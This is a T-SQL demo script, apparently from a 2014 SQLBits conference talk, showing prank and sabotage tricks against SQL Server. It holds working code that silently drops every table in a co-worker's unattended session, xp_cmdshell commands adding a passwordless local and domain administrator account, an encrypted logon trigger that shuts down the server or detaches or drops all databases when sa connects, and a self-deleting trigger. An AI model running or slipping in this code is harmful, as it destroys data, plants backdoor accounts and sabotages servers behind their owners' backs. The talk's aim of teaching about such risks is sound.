/*
Revenge: The SQL! - Director's Cut
Rob Volk
SQLBits XII - Telford, UK 2014-07-19
*/

USE tempdb;			-- just to be somewhat safe

IF OBJECT_ID('random_error') IS NOT NULL DROP TABLE random_error;

CREATE TABLE random_error(a INT NOT NULL,
CONSTRAINT chk_random CHECK (CHECKSUM(NEWID()) % 24 < 10));

-- run this multiple times
INSERT random_error VALUES(1);


-- *******************


-- here's a mean trick
set implicit_transactions on;
drop table random_error;		-- could be any table
set implicit_transactions off;

-- close window, watch the prompt

-- the following is slightly meaner...and a bit harder to type
-- but once you save it, it's easy to copy and paste 
-- into a co-worker's unattended query window on their unlocked desktop

declare @drop nvarchar(256);
declare drop_em cursor forward_only read_only for 
	select N'drop table ' + quotename(name) from sys.tables;
open drop_em;
fetch next from drop_em into @drop;

set implicit_transactions on;

while @@fetch_status=0 begin
	exec (@drop);
	fetch next from drop_em into @drop;
end

set implicit_transactions off;

close drop_em;
deallocate drop_em;

-- instead of closing window, just delete the code after running it!
-- yet another reason developers should not have sysadmin or ddl_admin :)

-- OK, dropping tables is pretty mean.
-- Truncating them is not as mean though.
-- That's why we make backups!


-- *******************


-- SQL Service Account with local or domain admin permissions
-- assume sa privileges and xp_cmdshell is/can be enabled

exec master..xp_cmdshell 'net user Calvin "" /ADD /active:yes /expires:never /passwordchg:yes /passwordreq:no'
exec master..xp_cmdshell 'net localgroup Administrators Calvin /add '

-- on a domain:

exec master..xp_cmdshell 'net user Calvin "" /ADD /active:yes /expires:never /passwordchg:yes /passwordreq:no /domain'
exec master..xp_cmdshell 'net group "Domain Administrators" Calvin /add /domain'

-- passwords can then be changed, users removed from groups, etc.
-- exercise for reader!
-- (and I didn't have time to fully test it)


-- *******************


-- Handy SQL Agent job to shut down server
EXEC msdb.dbo.sp_add_job @job_name=N'`', @enabled=1, @start_step_id=1, @notify_level_eventlog=0, @delete_level=3;
EXEC msdb.dbo.sp_add_jobserver @job_name=N'`', @server_name=@@SERVERNAME;
EXEC msdb.dbo.sp_add_jobstep @job_name=N'`', @step_id=1, @step_name=N'`', @command=N'SHUTDOWN;';

-- Simply call when needed:
EXEC msdb.dbo.sp_start_job @job_name=N'`';
GO

-- Like here:

:connect .
GO
use master;
GO

IF EXISTS(SELECT * FROM sys.server_triggers
	WHERE name='SA_LOGIN_PRIORITY')
DROP TRIGGER SA_LOGIN_PRIORITY ON ALL SERVER;
GO

CREATE TRIGGER SA_LOGIN_PRIORITY ON ALL SERVER 
WITH ENCRYPTION, EXECUTE AS N'sa'
AFTER LOGON AS
IF ORIGINAL_LOGIN()<>N'sa' OR APP_NAME() LIKE N'SQL Agent%' RETURN;
-- Wrath!
EXEC msdb.dbo.sp_start_job @job_name=N'`';
GO

:connect . -U sa -P sa
GO
use master;
GO

:connect .
GO
IF EXISTS(SELECT * FROM sys.server_triggers
	WHERE name='SA_LOGIN_PRIORITY')
DROP TRIGGER SA_LOGIN_PRIORITY ON ALL SERVER;
GO

-- Or we could do this:

CREATE TRIGGER SA_LOGIN_PRIORITY ON ALL SERVER 
WITH ENCRYPTION, EXECUTE AS N'sa'
AFTER LOGON AS
IF ORIGINAL_LOGIN()<>N'sa' OR APP_NAME() LIKE N'SQL Agent%' RETURN;

-- Wrath Part 2!
EXEC sp_msforeachdb 'EXEC sp_detach_db ''?'';';

-- or:
/*  -- Wrath: The Final Frontier
EXEC sp_msforeachdb 'DECLARE @db sysname=QUOTENAME(''?'');
EXEC(''DROP DATABASE '' + @db);'
*/
GO


-- *******************


-- I'll let you try this one out:
CREATE DATABASE [?] ON PRIMARY (NAME=Data, FILENAME='C:\SQLData\question', SIZE=4MB, FILEGROWTH=0MB)
LOG ON (NAME=Log, FILENAME='C:\SQLLogs\question', SIZE=2MB, FILEGROWTH=0MB);

EXEC sp_msforeachdb 'use ?; -- do other stuff';




-- Triggers that automatically drop themselves after X number of executions

-- this is just plain wrong
CREATE TRIGGER TriggerMayhem ON a FOR INSERT AS
SET NOCOUNT ON;
DECLARE @ctr int=0, @prop nvarchar(1), @sql nvarchar(max)=N'';
SET @sql=N'DROP TRIGGER ' + QUOTENAME(OBJECT_NAME(@@PROCID));
SELECT @ctr=CAST(value as int) FROM sys.extended_properties WHERE name=N'TriggerMayhem'
IF @ctr IS NULL OR @ctr=0 BEGIN
	EXEC sys.sp_addextendedproperty 
	@name = N'TriggerMayhem', 
	@value = N'0', 
	@level0type = N'SCHEMA', @level0name = dbo, 
	@level1type = N'TABLE',  @level1name = a,
	@level2type = N'TRIGGER',  @level2name = TriggerMayhem;
END

SET @prop=CAST(@ctr+1 as nvarchar(1));
EXEC sys.sp_updateextendedproperty 
@name = N'TriggerMayhem', 
@value = @prop, 
@level0type = N'SCHEMA', @level0name = dbo, 
@level1type = N'TABLE',  @level1name = a,
@level2type = N'TRIGGER',  @level2name = TriggerMayhem;
IF @ctr=1
	RAISERROR('I could have done worse.',16,1);  -- ROLLBACK won't set extended property
IF @ctr=2
	WAITFOR DELAY '00:00:10'
IF @ctr=3
	IF DB_ID('AdventureWorks') IS NOT NULL print 'AdventureWorks'
IF @ctr>3
	EXEC(@sql);
GO

SELECT OBJECT_ID('TriggerMayhem') Trig, * FROM sys.extended_properties;
INSERT a VALUES(1);
GO
SELECT OBJECT_ID('TriggerMayhem') Trig, * FROM sys.extended_properties;
INSERT a VALUES(2);
GO
SELECT OBJECT_ID('TriggerMayhem') Trig, * FROM sys.extended_properties;
INSERT a VALUES(3);
GO
SELECT OBJECT_ID('TriggerMayhem') Trig, * FROM sys.extended_properties;
INSERT a VALUES(4);
GO
SELECT OBJECT_ID('TriggerMayhem') Trig, * FROM sys.extended_properties;
INSERT a VALUES(5);
GO
SELECT OBJECT_ID('TriggerMayhem') Trig, * FROM sys.extended_properties;
SELECT * FROM a;

-- clean up
DROP TABLE a;
